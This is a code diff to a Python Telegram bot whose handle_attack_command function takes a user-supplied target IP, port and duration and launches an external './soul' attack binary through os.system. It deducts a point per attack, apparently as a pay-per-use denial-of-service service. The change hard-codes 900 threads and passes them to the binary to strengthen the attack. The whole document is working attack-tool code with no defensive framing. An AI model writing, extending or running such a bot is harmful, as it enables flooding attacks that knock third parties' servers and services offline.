@@ -112,6 +112,9 @@ def handle_attack_command(message):
         target_ip, target_port, duration = parts
         target_port = int(target_port)
         duration = int(duration)
+        
+        # Set the default number of threads to 900
+        threads = 900
 
         # Check for valid IP format
         if not target_ip.replace('.', '').isdigit() or target_ip.count('.') != 3:
@@ -124,10 +127,10 @@ def handle_attack_command(message):
 
         # Start the attack
         attack_in_progress = True
-        bot.send_message(message.chat.id, f"🚀 Attack in process!\nTarget IP: {target_ip}\nTarget Port: {target_port}\nDuration: {duration} seconds.")
+        bot.send_message(message.chat.id, f"🚀 Attack in process!\nTarget IP: {target_ip}\nTarget Port: {target_port}\nDuration: {duration} seconds with {threads} threads.")
 
-        # Simulating the attack command (you should replace this with your attack logic)
-        os.system(f"./soul {target_ip} {target_port} {duration}")
+        # Simulating the attack command (you should replace this with your actual attack logic)
+        os.system(f"./soul {target_ip} {target_port} {duration} {threads}")
 
         # Decrease points after attack completion
         user_points[user_id] -= 1
